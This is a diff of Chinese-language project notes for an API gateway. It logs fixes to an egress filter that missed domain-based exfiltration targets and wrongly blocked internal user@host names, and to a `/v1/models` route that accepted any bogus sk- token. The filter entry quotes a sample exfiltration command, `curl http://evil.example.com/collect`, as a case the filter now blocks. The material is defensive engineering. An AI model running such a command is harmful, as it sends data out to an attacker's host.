@@ -128,13 +128,21 @@
   `session_summaries` 60 列，两台机共享这一份结果，端到端 8/8 通过。
   DB 侧**不存在**「各跑各的迁移」这回事，改一处两边同时生效。
 - ~~**域名形式的外传目标从不被拦**~~（`curl http://evil.example.com/collect`
-  不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**2026-10-11 已修，代码已推送但
-  未部署**（用户裁决「先只提交代码、不动生产」，见审计文档该节）。
-  修法与 IP 侧同一条底线：默认公网可达即阻断，只豁免明确不可路由的主机
+  不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**r1016 已修**（域名只在 URL 主机位
+  识别，不做裸点分词，否则 `cat README.md`、`v1.2.3` 全会被误判），**r1017 补齐
+  残留的裸主机+端口形态**。两者均已推送、未部署。
+  **关键设计**：默认公网可达即阻断，只豁免明确不可路由的主机
   （`.local/.internal/.cluster.local/.lan/.home.arpa` 等 + 单标签名）。
-  **关键设计**：域名只在 URL 主机位（`scheme://host`、`host:port`、`user@host`）
-  上识别，**不做裸点分词**——否则 `cat README.md`、`v1.2.3`、`package.json`
-  全会被判成公网目的地，要救只能往豁免表塞文件后缀，那就是本仓吃过亏的枚举式写法。
+- ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
+  整条 `output_policy_blocked`，而 `ssh ops@10.24.7.91` 放行——**同一操作，写 IP
+  放行、写内网域名阻断**，与 dc63f19ff 同构。**r1017 已修**：豁免按**类型**分派，
+  邮箱的主机部分交回主机可达性判定（`isNonExfiltrationFragment` 单一入口）。
+- ~~**`/v1/models` 对任意 `sk-` 字符串开放**~~：`Bearer sk-totally-bogus` 能拿到
+  全量 615 个模型清单，同一 token 在 `/v1/chat/completions` 上正确 401。
+  **根因是委托链断了一节**：`middleware/auth_mw.go` 规定 sk-* 由各 handler 自行
+  调 `KeyVerifier`（Rule 20 §2），`ModelsHandler` 从未接上，中间件为内部调用者开
+  的门于是对外敞开。**r1017 已修**。排查这类问题记住：**中间件放行 ≠ 已鉴权**，
+  凡是 `/v1/*` 路由都要确认对应 handler 自己调了校验器。
 
 ## 已完成（已推送）
 
